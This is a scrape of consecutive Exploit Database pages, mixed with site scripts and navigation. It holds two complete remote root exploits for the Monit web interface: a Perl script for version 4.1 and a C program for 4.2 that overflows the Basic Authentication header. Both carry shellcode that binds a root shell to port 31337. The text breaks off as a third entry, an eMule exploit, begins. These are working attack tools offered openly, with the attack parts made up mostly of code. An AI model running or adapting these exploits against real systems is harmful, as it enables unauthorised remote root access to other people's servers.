getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 173
Monit 4.1 - Remote Buffer Overflow - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMonit 4.1 - Remote Buffer OverflowEDB-ID:173CVE:2003-1083EDB Verified:Author:gsichtType:remoteExploit:/Platform:LinuxDate:2004-04-09Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl## monit <= 4.1 remote root exploit# coded by gsicht (09.04.04)#use IO::Socket::INET;$socket = 0;my $shellcode = # 8 + 88 = 96 bytes portbind 31337"\x90\x90\x90\x90\x90\x90\x90\x90" ."\x90\x90\x90\x90\x90\x90\x90\x90" ."\x31\xc0\x31\xdb\xb0\x17\xcd\x80" ."\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80" ."\x89\xc7\x52\x66\x68" ."\x7a\x69" . # port 31337/tcp, change if needed"\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80" ."\xb0\x66\xb3\x04\xcd\x80" ."\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80" ."\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80" ."\x41\xe2\xf8\x51\x68n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80";print "\nmonit 4.1 dos exploit\n";print "coded by gsicht\n\n";if(@ARGV<1){print "Usage: perl agate.pl <target>\n\n";exit(0);}print "HOST:\t$ARGV[0]\n";print "PORT:\t2812\n";my $buffer = "B" x 284 . "\xcf\x89\xb3\x40" . $shellcode; # esp mandrake 9.1#my $buffer = "A" x 284 . "XXXX" . "B" x 100; #dos and debugprint "connecting to server...\n";$socket = IO::Socket::INET -> new( PeerAddr => $ARGV[0],PeerPort => 2812,Proto    => "tcp");if(!defined($socket)){print "could not connect :-P\n";sleep(1);exit(0);}print "connected\n";sleep(1);print "sending string\n";print $socket $buffer;close $socket;print "\ndosed!\n";# milw0rm.com [2004-04-09]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 174
Monit 4.2 - Remote Buffer Overflow - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMonit 4.2 - Remote Buffer OverflowEDB-ID:174CVE:2004-1897EDB Verified:Author:Abhisek DattaType:remoteExploit:/Platform:LinuxDate:2004-04-12Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** THE EYE ON SECURITY RESEARCH GROUP - INDIA** www eos-india net poc 305monit.c* Remote Root Exploit for Monit <= 4.2* Vulnerability: Buffer overflow in handling of Basic Authentication informations.* Server authenticates clients through:* Authentication: Basic Base64Encode[UserName:Password]* Here we are exploiting the insecure handling of username in Basic Authentication information to return* control (EIP) to our payload.** Nilanjan De [n2n linuxmail org] - Abhisek Datta [abhisek front ru]** 06.04.2004* www eos-india net*/#include <stdio.h>#include <sys/types.h>#include <sys/socket.h>#include <netdb.h>#include <unistd.h>#define 	BUFF_SIZE	2048#define		PADDING		40#define		EXP_SIZE	(256+4+PADDING)#define MAX_ARCH 2struct eos{char *arch;unsigned long ret;} targets[] = {"Monit-4.2-Gentoo",0xbf7fef02,//-------------------------------"Monit <=4.2 Crash",0xbadc0ded,NULL,0};/*x86 linux portbind a shell in port 31337based on shellcode from www.shellcode.com.arwith a few modifications by us*/char shellcode[]=/* sys_fork() */"\x31\xc0"                      // xorl         %eax,%eax"\x31\xdb"                      // xorl         %ebx,%ebx"\xb0\x02"                      // movb         $0x2,%al"\xcd\x80"                      // int          $0x80"\x38\xc3"                      // cmpl         %ebx,%eax"\x74\x05"                      // je           0x5/* sys_exit() */"\x8d\x43\x01"                  // leal         0x1(%ebx),%eax"\xcd\x80"                      // int          $0x80/* setuid(0) */"\x31\xc0"                      // xorl         %eax,%eax"\x31\xdb"                      // xorl         %ebx,%ebx"\xb0\x17"                      // movb         $0x17,%al"\xcd\x80"                      // int          $0x80/* socket() */"\x31\xc0"                      // xorl    %eax,%eax"\x89\x45\x10"                  // movl    %eax,0x10(%ebp)(IPPROTO_IP = 0x0)"\x40"                          // incl    %eax"\x89\xc3"                      // movl    %eax,%ebx(SYS_SOCKET = 0x1)"\x89\x45\x0c"                  // movl    %eax,0xc(%ebp)(SOCK_STREAM = 0x1)"\x40"                          // incl    %eax"\x89\x45\x08"                  // movl    %eax,0x8(%ebp)(AF_INET = 0x2)"\x8d\x4d\x08"                  // leal    0x8(%ebp),%ecx"\xb0\x66"                      // movb    $0x66,%al"\xcd\x80"                      // int     $0x80"\x89\x45\x08"                  // movl    %eax,0x8(%ebp)/* bind()*/"\x43"                          // incl    %ebx(SYS_BIND = 0x2)"\x66\x89\x5d\x14"              // movw    %bx,0x14(%ebp)(AF_INET = 0x2)"\x66\xc7\x45\x16\x7a\x69"      // movw    $0x697a,0x16(%ebp)(port=31337)"\x31\xd2"                      // xorl    %edx,%edx"\x89\x55\x18"                  // movl    %edx,0x18(%ebp)"\x8d\x55\x14"                  // leal    0x14(%ebp),%edx"\x89\x55\x0c"                  // movl    %edx,0xc(%ebp)"\xc6\x45\x10\x10"              // movb    $0x10,0x10(%ebp)(sizeof(struct sockaddr) = 10h = 16)"\xb0\x66"                      // movb    $0x66,%al"\xcd\x80"                      // int     $0x80/* listen() */"\x40"                          // incl    %eax"\x89\x45\x0c"                  // movl    %eax,0xc(%ebp)"\x43"                          // incl    %ebx"\x43"                          // incl    %ebx(SYS_LISTEN = 0x4)"\xb0\x66"                      // movb    $0x66,%al"\xcd\x80"                      // int     $0x80/* accept() */"\x43"                          // incl    %ebx"\x89\x45\x0c"                  // movl    %eax,0xc(%ebp)"\x89\x45\x10"                  // movl    %eax,0x10(%ebp)"\xb0\x66"                      // movb    $0x66,%al"\xcd\x80"                      // int     $0x80"\x89\xc3"                      // movl    %eax,%ebx/* dup2() */"\x31\xc9"                      // xorl    %ecx,%ecx"\xb0\x3f"                      // movb    $0x3f,%al"\xcd\x80"                      // int     $0x80"\x41"                          // incl    %ecx"\x80\xf9\x03"                  // cmpb    $0x3,%cl"\x75\xf6"                      // jne     -0xa/* execve() */"\x31\xd2"                      // xorl    %edx,%edx"\x52"                          // pushl   %edx"\x68\x6e\x2f\x73\x68"          // pushl   $0x68732f6e"\x68\x2f\x2f\x62\x69"          // pushl   $0x69622f2f"\x89\xe3"                      // movl    %esp,%ebx"\x52"                          // pushl   %edx"\x53"                          // pushl   %ebx"\x89\xe1"                      // movl    %esp,%ecx"\xb0\x0b"                      // movb    $0xb,%al"\xcd\x80";                     // int     $0x80void show_help(char *pr00gie,u_short opt) {int i=0;printf("==========> THE EYE ON SECURITY RESEARCH GROUP <==========\n");printf("Monit <= 4.2 Remote Root Exploit\n");printf("n2n[at]linuxmail[dot]org - abhisek[at]front[dot]ru\n");printf("http://www.eos-india.net\n\n");if(!opt)return;printf("[usage]\n");printf("%s [Remote Host] [Remote Port] [Target]\n",pr00gie);printf("[Available Targets]\n");while(targets[i].arch != NULL) {printf("%d. - %s\t - %p\n",(i),targets[i].arch,targets[i].ret);i++;}}/* Base 64 code ripped from monit src *//*** Base64 encode one byte*/static char encode(unsigned char u) {if(u < 26)  return 'A'+u;if(u < 52)  return 'a'+(u-26);if(u < 62)  return '0'+(u-52);if(u == 62) return '+';return '/';}/*** Base64 encode and return size data in 'src'. The caller must free the* returned string.* @param size The size of the data in src* @param src The data to be base64 encode* @return encoded string otherwise NULL*/char *encode_base64(int size, unsigned char *src) {int i;char *out, *p;if(!src)return NULL;if(!size)size= strlen((char *)src);out= (char *)malloc(sizeof(char)*size*4/3+4);p= out;for(i=0; i<size; i+=3) {unsigned char b1=0, b2=0, b3=0, b4=0, b5=0, b6=0, b7=0;b1 = src[i];if(i+1<size)b2 = src[i+1];if(i+2<size)b3 = src[i+2];b4= b1>>2;b5= ((b1&0x3)<<4)|(b2>>4);b6= ((b2&0xf)<<2)|(b3>>6);b7= b3&0x3f;*p++= encode(b4);*p++= encode(b5);if(i+1<size) {*p++= encode(b6);} else {*p++= '=';}if(i+2<size) {*p++= encode(b7);} else {*p++= '=';}}return out;}void make_http_request(char *buff,int size,char *host,unsigned long *magic) {char *exp_buff;char *exp_buff_encoded;int i;if (!(exp_buff=(char*)malloc(EXP_SIZE))){perror("malloc()");exit(1);}memset(exp_buff,0x90,EXP_SIZE);strcpy(exp_buff+256-strlen(shellcode),shellcode);for(i=256;i<EXP_SIZE-5;i+=4)memcpy(exp_buff+i,magic,4);strcpy(exp_buff+EXP_SIZE-4,":x");exp_buff_encoded=encode_base64(EXP_SIZE,exp_buff);memset(buff,0x00,size);sprintf(buff,"GET / HTTP/1.0\r\n");sprintf(buff,"%sHost: %s\r\n",buff,host);sprintf(buff,"%sAuthorization: Basic %s\r\n\r\n\r\n",buff,exp_buff_encoded);}int main(int argc,char *argv[]) {char *host;char *b;int rport;int sockfd;struct sockaddr_in sin;struct hostent *h;unsigned int n;unsigned long magic;if(argc != 4) {show_help(argv[0],1);exit(1);}host=argv[1];rport=(atoi(argv[2]));n=atoi(argv[3]);if((n >= MAX_ARCH)||(n<0)) {printf("- Invalid target\n");show_help(argv[0],1);exit(1);}magic=targets[n].ret;show_help(argv[0],0);printf("-Using RET %p\n",magic);printf("Resolving %s\t",host);h=gethostbyname(host);if(!h) {printf("[ERROR]\nUnable to resolve: %s\n",host);exit(1);}elseprintf("[DONE]\n");b=(char*)malloc(BUFF_SIZE);if(!b) {perror("malloc");exit(1);}sin.sin_addr=*((struct in_addr*)h->h_addr);sin.sin_family=AF_INET;sin.sin_port=htons((u_short)rport);if((sockfd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0){perror("socket");exit(1);}printf("Connecting to %s:%d\t",host,rport);if(connect(sockfd,(struct sockaddr*)&sin,sizeof(sin))<0) {printf("[ERROR]\nUnable to connect: %s:%d\n",host,rport);perror("connect");exit(1);}elseprintf("[DONE]\n");make_http_request(b,BUFF_SIZE,host,&magic);if(send(sockfd,b,strlen(b),0) == strlen(b))printf("Successfully send exploit string\n");elseprintf("Failed sending exploit string\n");close(sockfd);return 0;}// milw0rm.com [2004-04-12]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 175
eMule 0.42d - IRC Remote Buffer Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: 